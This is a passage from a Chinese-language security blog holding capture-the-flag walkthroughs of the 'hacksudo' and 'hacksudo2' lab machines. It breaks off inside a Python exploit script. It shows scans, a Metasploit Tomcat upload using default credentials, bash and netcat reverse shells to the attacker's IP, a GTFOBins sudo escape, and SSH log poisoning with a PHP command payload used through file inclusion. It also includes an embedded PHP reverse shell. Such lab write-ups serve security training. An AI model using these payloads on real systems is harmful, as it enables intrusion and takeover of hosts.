<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin/Desktop# arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:fa:35:f2, IPv4: 192.168.43.86</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.43.1    ce:98:ba:98:c4:97       (Unknown: locally administered)</span><br><span class="line">192.168.43.16   08:00:27:8b:0d:49       PCS Systemtechnik GmbH</span><br><span class="line">192.168.43.188  d0:c6:37:be:7e:b3       Intel Corporate</span><br><span class="line"></span><br><span class="line">3 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 1.988 seconds (128.77 hosts/sec). 3 responded</span><br></pre></td></tr></table></figure>

<ul>
<li>目标为 <code>192.168.43.16</code></li>
<li><code>NMAP</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sV -A -p 1-65535 192.168.43.16</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin/Desktop# nmap -sV -A -p 1-65535 192.168.43.16</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2021-04-20 09:42 EDT</span><br><span class="line">Nmap scan report for 192.168.43.16</span><br><span class="line">Host is up (0.00058s latency).</span><br><span class="line">Not shown: 65532 filtered ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.46 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.46 (Ubuntu)</span><br><span class="line">|_http-title: Hacksudo | shops</span><br><span class="line">2222/tcp open  ssh     OpenSSH 8.3p1 Ubuntu 1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">8080/tcp open  http    Apache Tomcat 9.0.24</span><br><span class="line">|_http-favicon: Apache Tomcat</span><br><span class="line">|_http-open-proxy: Proxy might be redirecting requests</span><br><span class="line">|_http-title: Apache Tomcat/9.0.24</span><br><span class="line">MAC Address: 08:00:27:8B:0D:49 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Aggressive OS guesses: Linux 2.6.32 (94%), Linux 3.10 - 4.11 (94%), Linux 3.2 - 4.9 (94%), Linux 3.4 - 3.10 (94%), Linux 2.6.32 - 3.10 (93%), Linux 2.6.32 - 3.13 (93%), Linux 3.10 (93%), Synology DiskStation Manager 5.2-5644 (92%), Linux 2.6.22 - 2.6.36 (91%), Linux 2.6.39 (91%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.58 ms 192.168.43.16</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                                   </span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 117.81 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li>目录扫描</li>
</ul>
<p><img data-src="./hacksudo1/1.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.43.16/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin# gobuster dir -u http://192.168.43.16/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:            http://192.168.43.16/</span><br><span class="line">[+] Threads:        10</span><br><span class="line">[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Status codes:   200,204,301,302,307,401,403</span><br><span class="line">[+] User Agent:     gobuster/3.0.1</span><br><span class="line">[+] Extensions:     html,txt,php</span><br><span class="line">[+] Timeout:        10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/04/20 09:46:47 Starting gobuster</span><br><span class="line">===============================================================</span><br><span class="line">/index.php (Status: 200)</span><br><span class="line">/search.php (Status: 200)</span><br><span class="line">/info.txt (Status: 200)</span><br><span class="line">/html (Status: 301)</span><br><span class="line">/signup.php (Status: 200)</span><br><span class="line">/admin.php (Status: 200)</span><br><span class="line">/scripts (Status: 301)</span><br><span class="line">/cart.html (Status: 200)</span><br><span class="line">/add.php (Status: 200)</span><br><span class="line">/css (Status: 301)</span><br><span class="line">/log.php (Status: 200)</span><br><span class="line">/hp.php (Status: 200)</span><br><span class="line">/query.txt (Status: 200)</span><br><span class="line">/pro.php (Status: 200)</span><br><span class="line">/config.php (Status: 200)</span><br><span class="line">/res (Status: 301)</span><br><span class="line">/LICENSE (Status: 200)</span><br><span class="line">/delete.php (Status: 200)</span><br><span class="line">/inventory.php (Status: 200)</span><br><span class="line">/hg.php (Status: 200)</span><br><span class="line">/view_cart.php (Status: 200)</span><br><span class="line">/fandom.php (Status: 200)</span><br><span class="line">/got.php (Status: 200)</span><br><span class="line">/add_product.php (Status: 200)</span><br><span class="line">/server-status (Status: 403)</span><br><span class="line">/flag1.txt (Status: 200)</span><br><span class="line">===============================================================</span><br><span class="line">2021/04/20 09:48:40 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>



<h3 id="登录web"><a href="#登录web" class="headerlink" title="登录web"></a>登录web</h3><ul>
<li>首页</li>
</ul>
<p><img data-src="./hacksudo1/2.png" alt></p>
<ul>
<li><a href="http://192.168.43.16/info.txt" target="_blank" rel="noopener">http://192.168.43.16/info.txt</a></li>
</ul>
<p><img data-src="./hacksudo1/3.png" alt></p>
<ul>
<li>发现账号密码</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Email				Password</span><br><span class="line">jimit@example.com		100596</span><br><span class="line">admin@example.com		admin</span><br></pre></td></tr></table></figure>

<p>备注：这里的账号登录失败</p>
<p><img data-src="./hacksudo1/4.png" alt></p>
<h3 id="Tomcat入手"><a href="#Tomcat入手" class="headerlink" title="Tomcat入手"></a>Tomcat入手</h3><p><img data-src="./hacksudo1/5.png" alt></p>
<p><a href="https://book.hacktricks.xyz/pentesting/pentesting-web/tomcat" target="_blank" rel="noopener">https://book.hacktricks.xyz/pentesting/pentesting-web/tomcat</a></p>
<ul>
<li>常用密码破解</li>
</ul>
<p><img data-src="./hacksudo1/6.png" alt></p>
<p><img data-src="./hacksudo1/7.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 获得密码 admin / admin</span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>getshell</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use exploit/multi/http/tomcat_mgr_upload</span><br><span class="line">msf exploit(multi/http/tomcat_mgr_upload) &gt; set rhost 192.168.43.16</span><br><span class="line">msf exploit(multi/http/tomcat_mgr_upload) &gt; set rport 8080</span><br><span class="line">msf exploit(multi/http/tomcat_mgr_upload) &gt; set httpusername admin</span><br><span class="line">msf exploit(multi/http/tomcat_mgr_upload) &gt; set httppassword admin</span><br><span class="line">msf exploit(multi/http/tomcat_mgr_upload) &gt; exploit</span><br></pre></td></tr></table></figure>

<p><img data-src="./hacksudo1/8.png" alt></p>
<h3 id="提权，拿flag"><a href="#提权，拿flag" class="headerlink" title="提权，拿flag"></a>提权，拿flag</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 交互 shell</span></span><br><span class="line">python3 -c 'import pty;pty.spawn("/bin/bash")'</span><br></pre></td></tr></table></figure>

<p><img data-src="./hacksudo1/9.png" alt></p>
<p><img data-src="./hacksudo1/10.png" alt></p>
<ul>
<li>pspy64 发现该脚本执行权限</li>
</ul>
<p><img data-src="./hacksudo1/11.png" alt></p>
<ul>
<li><p>但是这里 <code>manage.sh</code>并没有写入权限，提权中断</p>
</li>
<li><p>发现备份文件</p>
</li>
</ul>
<p><img data-src="./hacksudo1/12.png" alt></p>
<ul>
<li><code>nc</code>传递文件</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -lvnp 7890 &gt; vishal.jpg</span><br><span class="line">nc 192.168.43.86 7890 &lt; vishal.jpg</span><br><span class="line"></span><br><span class="line">nc -lvnp 7890 &gt; log.txt</span><br><span class="line">nc 192.168.43.86 7890 &lt; log.txt</span><br><span class="line"></span><br><span class="line">nc -lvnp 7890 &gt; hacksudo.zip</span><br><span class="line">nc 192.168.43.86 7890 &lt; hacksudo.zip</span><br></pre></td></tr></table></figure>

<ul>
<li>发现图片隐写</li>
</ul>
<p><img data-src="./hacksudo1/13.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> git <span class="built_in">clone</span> https://github.com/Paradoxis/StegCracker.git</span></span><br><span class="line">stegcracker vishal.jpg /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>

<p><img data-src="./hacksudo1/14.png" alt></p>
<p><img data-src="./hacksudo1/15.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">onpxhc bs unpxfhqb znpuvar hfre</span><br><span class="line">hfre ivfuny</span><br><span class="line">cnffjbeq 985nn195p09so7q64n4oo24psr51so1s13rop444p494r765rr99q6p3rs46557p757787s8s5n6r0260q2r0r846q263sosor1311p884oo0os9792s8778n4434327</span><br></pre></td></tr></table></figure>

<p><img data-src="./hacksudo1/16.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">backup of hacksudo machine user user vishal password 985aa195c09fb7d64a4bb24cfe51fb1f13ebc444c494e765ee99d6c3ef46557c757787f8f5a6e0260d2e0e846d263fbfbe1311c884bb0bf9792f8778a4434327</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> https://crackstation.net/</span></span><br></pre></td></tr></table></figure>

<p><img data-src="./hacksudo1/17.png" alt></p>
<ul>
<li><p>获得账号密码 <code>vishal / hacker</code></p>
</li>
<li><p>查看用户信息</p>
</li>
</ul>
<p><img data-src="./hacksudo1/18.png" alt></p>
<ul>
<li>利用上面的<code>manage.sh</code>水平到<code>hacksudo</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo "bash -i &gt;&amp; /dev/tcp/192.168.43.86/7890 0&gt;&amp;1" &gt;&gt; manage.sh</span><br><span class="line">chmod 777 manage.sh</span><br></pre></td></tr></table></figure>

<p><img data-src="./hacksudo1/19.png" alt></p>
<p><a href="https://gtfobins.github.io/gtfobins/scp/#limited-suid" target="_blank" rel="noopener">https://gtfobins.github.io/gtfobins/scp/#limited-suid</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">TF=$(mktemp)</span><br><span class="line">echo 'sh 0&lt;&amp;2 1&gt;&amp;2' &gt; $TF</span><br><span class="line">chmod +x "$TF"</span><br><span class="line">sudo scp -S $TF x y:</span><br></pre></td></tr></table></figure>

<p><img data-src="./hacksudo1/20.png" alt></p>
<p><img data-src="./hacksudo1/21.png" alt></p>
]]></content>
      <categories>
        <category>靶场</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>综合靶场测试</tag>
        <tag>hacksudo</tag>
      </tags>
  </entry>
  <entry>
    <title>hacksudo2</title>
    <url>/2021/04/22/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/hacksudo2/</url>
    <content><![CDATA[<h1 id="hacksudo2"><a href="#hacksudo2" class="headerlink" title="hacksudo2"></a>hacksudo2</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
<a id="more"></a>

<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
<li>kali2020</li>
<li>hacksudo2</li>
<li>windows10</li>
</ul>
<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/var/www/html# arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:fa:35:f2, IPv4: 192.168.43.86</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.43.1    30:45:96:e4:ed:56       HUAWEI TECHNOLOGIES CO.,LTD</span><br><span class="line">192.168.43.33   d0:c6:37:be:7e:b3       Intel Corporate</span><br><span class="line">192.168.43.154  a4:50:46:78:16:9f       Xiaomi Communications Co Ltd</span><br><span class="line">192.168.43.214  08:00:27:d1:cb:db       PCS Systemtechnik GmbH</span><br><span class="line"></span><br><span class="line">4 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 1.950 seconds (131.28 hosts/sec). 4 responded</span><br></pre></td></tr></table></figure>

<ul>
<li>目标为 <code>192.168.43.166</code></li>
<li><code>NMAP</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sV -A -p 1-65535 192.168.43.166</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin/hacksuodo1# nmap -sV -A -p 1-65535 192.168.43.166</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2021-04-21 05:33 EDT</span><br><span class="line">Nmap scan report for 192.168.43.166</span><br><span class="line">Host is up (0.00064s latency).</span><br><span class="line">Not shown: 65527 closed ports</span><br><span class="line">PORT      STATE SERVICE  VERSION</span><br><span class="line">80/tcp    open  http     Apache httpd 2.4.46 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.46 (Ubuntu)</span><br><span class="line">|_http-title: hacksudo:2</span><br><span class="line">111/tcp   open  rpcbind  2-4 (RPC #100000)</span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version    port/proto  service</span><br><span class="line">|   100000  2,3,4        111/tcp   rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp   rpcbind</span><br><span class="line">|   100000  3,4          111/tcp6  rpcbind</span><br><span class="line">|   100000  3,4          111/udp6  rpcbind</span><br><span class="line">|   100003  3           2049/udp   nfs</span><br><span class="line">|   100003  3           2049/udp6  nfs</span><br><span class="line">|   100003  3,4         2049/tcp   nfs</span><br><span class="line">|   100003  3,4         2049/tcp6  nfs</span><br><span class="line">|   100005  1,2,3      42743/tcp6  mountd</span><br><span class="line">|   100005  1,2,3      47666/udp6  mountd</span><br><span class="line">|   100005  1,2,3      53357/tcp   mountd</span><br><span class="line">|   100005  1,2,3      60044/udp   mountd</span><br><span class="line">|   100021  1,3,4      39905/tcp6  nlockmgr</span><br><span class="line">|   100021  1,3,4      41507/tcp   nlockmgr</span><br><span class="line">|   100021  1,3,4      42260/udp6  nlockmgr</span><br><span class="line">|   100021  1,3,4      59542/udp   nlockmgr</span><br><span class="line">|   100227  3           2049/tcp   nfs_acl</span><br><span class="line">|   100227  3           2049/tcp6  nfs_acl</span><br><span class="line">|   100227  3           2049/udp   nfs_acl</span><br><span class="line">|_  100227  3           2049/udp6  nfs_acl</span><br><span class="line">1337/tcp  open  ssh      OpenSSH 8.3p1 Ubuntu 1ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">2049/tcp  open  nfs_acl  3 (RPC #100227)</span><br><span class="line">35955/tcp open  mountd   1-3 (RPC #100005)</span><br><span class="line">41507/tcp open  nlockmgr 1-4 (RPC #100021)</span><br><span class="line">53357/tcp open  mountd   1-3 (RPC #100005)</span><br><span class="line">60929/tcp open  mountd   1-3 (RPC #100005)</span><br><span class="line">MAC Address: 08:00:27:D1:CB:DB (Oracle VirtualBox virtual NIC)</span><br><span class="line">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br><span class="line">TCP/IP fingerprint:</span><br><span class="line">OS:SCAN(V=7.80%E=4%D=4/21%OT=80%CT=1%CU=40365%PV=Y%DS=1%DC=D%G=Y%M=080027%T</span><br><span class="line">OS:M=607FF194%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10D%TI=Z%CI=Z%II=I</span><br><span class="line">OS:%TS=A)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O</span><br><span class="line">OS:5=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6</span><br><span class="line">OS:=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O</span><br><span class="line">OS:%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=</span><br><span class="line">OS:0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%</span><br><span class="line">OS:S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(</span><br><span class="line">OS:R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=</span><br><span class="line">OS:N%T=40%CD=S)</span><br><span class="line"></span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.64 ms 192.168.43.166</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 20.96 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li>目录扫描</li>
</ul>
<p><img data-src="./hacksudo2/1.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.43.166/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/var/www/html# dirb http://192.168.43.214/ /usr/share/wordlists/dirb/big.txt -X .php</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Mon Apr  5 01:47:42 2021</span><br><span class="line">URL_BASE: http://192.168.43.214/</span><br><span class="line">WORDLIST_FILES: /usr/share/wordlists/dirb/big.txt</span><br><span class="line">EXTENSIONS_LIST: (.php) | (.php) [NUM = 1]</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 20458                                                         </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://192.168.43.214/ ----</span><br><span class="line">+ http://192.168.43.214/file.php (CODE:200|SIZE:238)                                                                                                                                   </span><br><span class="line">+ http://192.168.43.214/info.php (CODE:200|SIZE:79922)                                                                                                                                 </span><br><span class="line">                                                                                                                                                                                       </span><br><span class="line">-----------------</span><br><span class="line">END_TIME: Mon Apr  5 01:48:01 2021</span><br><span class="line">DOWNLOADED: 20458 - FOUND: 2root@kali:/home/caixin# gobuster dir -u http://192.168.43.166/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:            http://192.168.43.166/</span><br><span class="line">[+] Threads:        10</span><br><span class="line">[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Status codes:   200,204,301,302,307,401,403</span><br><span class="line">[+] User Agent:     gobuster/3.0.1</span><br><span class="line">[+] Extensions:     html,txt,php</span><br><span class="line">[+] Timeout:        10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/04/21 05:35:11 Starting gobuster</span><br><span class="line">===============================================================</span><br><span class="line">/index.html (Status: 200)</span><br><span class="line">/info.php (Status: 200)</span><br><span class="line">/web (Status: 301)</span><br><span class="line">/audio (Status: 301)</span><br><span class="line">/css (Status: 301)</span><br><span class="line">/test.html (Status: 200)</span><br><span class="line">/lib (Status: 301)</span><br><span class="line">/file.php (Status: 200)</span><br><span class="line">/game.html (Status: 200)</span><br><span class="line">/tiles (Status: 301)</span><br><span class="line">/server-status (Status: 403)</span><br><span class="line">===============================================================</span><br><span class="line">2021/04/21 05:37:48 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>

<h3 id="登录web"><a href="#登录web" class="headerlink" title="登录web"></a>登录web</h3><ul>
<li>首页</li>
</ul>
<p><img data-src="./hacksudo2/2.png" alt></p>
<ul>
<li><a href="http://192.168.43.166/info.php" target="_blank" rel="noopener">http://192.168.43.166/info.php</a></li>
</ul>
<p>发现<code>phpinfo</code>敏感信息</p>
<p><img data-src="./hacksudo2/3.png" alt></p>
<h3 id="发现文件包含"><a href="#发现文件包含" class="headerlink" title="发现文件包含"></a>发现文件包含</h3><p><img data-src="./hacksudo2/4.png" alt></p>
<p><img data-src="./hacksudo2/5.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:100:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:101:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">messagebus:x:103:106::/nonexistent:/usr/sbin/nologin</span><br><span class="line">syslog:x:104:110::/home/syslog:/usr/sbin/nologin</span><br><span class="line">_apt:x:105:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false</span><br><span class="line">uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin</span><br><span class="line">tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin</span><br><span class="line">landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin</span><br><span class="line">pollinate:x:110:1::/var/cache/pollinate:/bin/false</span><br><span class="line">usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin</span><br><span class="line">sshd:x:112:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin</span><br><span class="line">hacksudo:x:1000:1000:hacksudo:/home/hacksudo:/bin/bash</span><br><span class="line">lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false</span><br><span class="line">_rpc:x:113:65534::/run/rpcbind:/usr/sbin/nologin</span><br><span class="line">statd:x:114:65534::/var/lib/nfs:/usr/sbin/nologin</span><br></pre></td></tr></table></figure>

<h3 id="日志投毒"><a href="#日志投毒" class="headerlink" title="日志投毒"></a>日志投毒</h3><p><a href="https://www.hackingarticles.in/rce-with-lfi-and-ssh-log-poisoning/" target="_blank" rel="noopener">https://www.hackingarticles.in/rce-with-lfi-and-ssh-log-poisoning/</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh '&lt;?php system($_GET['wei']); ?&gt;'@192.168.43.166 -p 1337</span><br></pre></td></tr></table></figure>

<p><img data-src="./hacksudo2/6.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">反弹shell</span><br><span class="line">http://192.168.43.166/file.php?file=../../../../var/log/auth.log&amp;wei=nc -e /bin/bash 192.168.43.86 8833</span><br></pre></td></tr></table></figure>

<p>失败，应该是没有权限</p>
<h3 id="phpinfolfi"><a href="#phpinfolfi" class="headerlink" title="phpinfolfi"></a>phpinfolfi</h3><p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/phpinfolfi.py" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/phpinfolfi.py</a></p>
<p>构造代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">from</span> builtins <span class="keyword">import</span> range</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setup</span><span class="params">(host, port)</span>:</span></span><br><span class="line">    TAG=<span class="string">"Security Test"</span></span><br><span class="line">    PAYLOAD=<span class="string">"""%s\r</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">set_time_limit (0);</span></span><br><span class="line"><span class="string">$VERSION = "1.0";</span></span><br><span class="line"><span class="string">$ip = '192.168.43.86';  // CHANGE THIS</span></span><br><span class="line"><span class="string">$port = 7777;       // CHANGE THIS</span></span><br><span class="line"><span class="string">$chunk_size = 1400;</span></span><br><span class="line"><span class="string">$write_a = null;</span></span><br><span class="line"><span class="string">$error_a = null;</span></span><br><span class="line"><span class="string">$shell = 'uname -a; w; id; /bin/sh -i';</span></span><br><span class="line"><span class="string">$daemon = 0;</span></span><br><span class="line"><span class="string">$debug = 0;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//</span></span><br><span class="line"><span class="string">// Daemonise ourself if possible to avoid zombies later</span></span><br><span class="line"><span class="string">//</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// pcntl_fork is hardly ever available, but will allow us to daemonise</span></span><br><span class="line"><span class="string">// our php process and avoid zombies.  Worth a try...</span></span><br><span class="line"><span class="string">if (function_exists('pcntl_fork')) &#123;</span></span><br><span class="line"><span class="string">	// Fork and have the parent process exit</span></span><br><span class="line"><span class="string">	$pid = pcntl_fork();</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">	if ($pid == -1) &#123;</span></span><br><span class="line"><span class="string">		printit("ERROR: Can't fork");</span></span><br><span class="line"><span class="string">		exit(1);</span></span><br><span class="line"><span class="string">	&#125;</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">	if ($pid) &#123;</span></span><br><span class="line"><span class="string">		exit(0);  // Parent exits</span></span><br><span class="line"><span class="string">	&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	// Make the current process a session leader</span></span><br><span class="line"><span class="string">	// Will only succeed if we forked</span></span><br><span class="line"><span class="string">	if (posix_setsid() == -1) &#123;</span></span><br><span class="line"><span class="string">		printit("Error: Can't setsid()");</span></span><br><span class="line"><span class="string">		exit(1);</span></span><br><span class="line"><span class="string">	